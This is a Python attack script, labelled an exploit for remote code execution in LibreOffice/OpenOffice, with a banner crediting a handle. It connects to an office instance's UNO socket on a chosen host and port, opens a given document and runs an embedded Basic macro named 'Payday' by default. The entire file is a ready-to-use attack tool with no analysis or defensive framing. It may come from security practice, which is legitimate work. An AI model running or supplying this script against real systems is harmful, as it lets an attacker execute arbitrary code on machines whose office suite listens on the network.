import uno
from com.sun.star.task import ErrorCodeIOException
import argparse

# Options
parser = argparse.ArgumentParser(description='Exploit for LibreOffice / OpenOffice - Remote Code Execution')
parser.add_argument('--file', '-f', dest='file', type=str, required=True, help='The path to the file to be opened and the macro to be executed')
parser.add_argument('--host', '-H', dest='host', type=str, default='localhost', required=False, help='The host where the LibreOffice / OpenOffice is running')
parser.add_argument('--port', '-P', dest='port', type=int, default=2002, required=False, help='The port where the LibreOffice / OpenOffice is running')
parser.add_argument('--library', '-L', dest='library', type=str, default='Standard', required=False, help='The name of the library where the macro is located')
parser.add_argument('--module', '-M', dest='module', type=str, default='Module1', required=False, help='The name of the module where the macro is located')
parser.add_argument('--macro', '-m', dest='macro', type=str, default='Payday', required=False, help='The name of the macro to be executed')

args = parser.parse_args()

class colors:
    reset = '\033[0m'
    gold = '\033[33m'
    green = '\033[32m'
    red = '\033[31m'

print(colors.gold + \
"""


███╗   ███╗███╗   ███╗    ██╗  ██╗ █████╗ ███╗   ██╗██████╗ ██╗     ███████╗██████╗ 
████╗ ████║████╗ ████║    ██║  ██║██╔══██╗████╗  ██║██╔══██╗██║     ██╔════╝██╔══██╗
██╔████╔██║██╔████╔██║    ███████║███████║██╔██╗ ██║██║  ██║██║     █████╗  ██████╔╝
██║╚██╔╝██║██║╚██╔╝██║    ██╔══██║██╔══██║██║╚██╗██║██║  ██║██║     ██╔══╝  ██╔══██╗
██║ ╚═╝ ██║██║ ╚═╝ ██║    ██║  ██║██║  ██║██║ ╚████║██████╔╝███████╗███████╗██║  ██║
╚═╝     ╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝
                                                                                    
""" + colors.reset + "\t\t\t\t" + colors.green + "Authors: __zhsh9__" + colors.reset + "\n")

# Obtain the component context from the UNO runtime
local_context = uno.getComponentContext()

# Create a UNO URL resolver
resolver = local_context.ServiceManager.createInstanceWithContext(
    "com.sun.star.bridge.UnoUrlResolver", local_context
)

# Connect to a running LibreOffice instance
ctx = resolver.resolve(
    f"uno:socket,host={args.host},port={args.port};urp;StarOffice.ComponentContext"
)
smgr = ctx.ServiceManager

# Get the central desktop object
desktop = smgr.createInstanceWithContext("com.sun.star.frame.Desktop", ctx)

# Convert the local file system path to a UNO URL
file_path = args.file
uno_file_url = uno.systemPathToFileUrl(file_path)

# Open the document
doc = desktop.loadComponentFromURL(
    uno_file_url, "_blank", 0, ()
)

# Now the document `file.ods` is open, you can proceed with the required operations

# The name of the macro is 'Payday'
macro_name = args.macro

# Assemble the full URL for the macro
module_name = args.module
library_name = args.library
macro_url = "vnd.sun.star.script:%s.%s.%s?language=Basic&location=document" % (library_name, module_name, macro_name)

# Get the script provider
script_provider = doc.getScriptProvider()

try:
    # Get the script for the macro
    script = script_provider.getScript(macro_url)

    # Execute the macro
    script.invoke((), (), ())
    print("[+] Macro executed successfully.")
except ErrorCodeIOException as e:
    # Error handling for failed macro execution
    print("[!] Error executing macro: {}".format(e.Message))
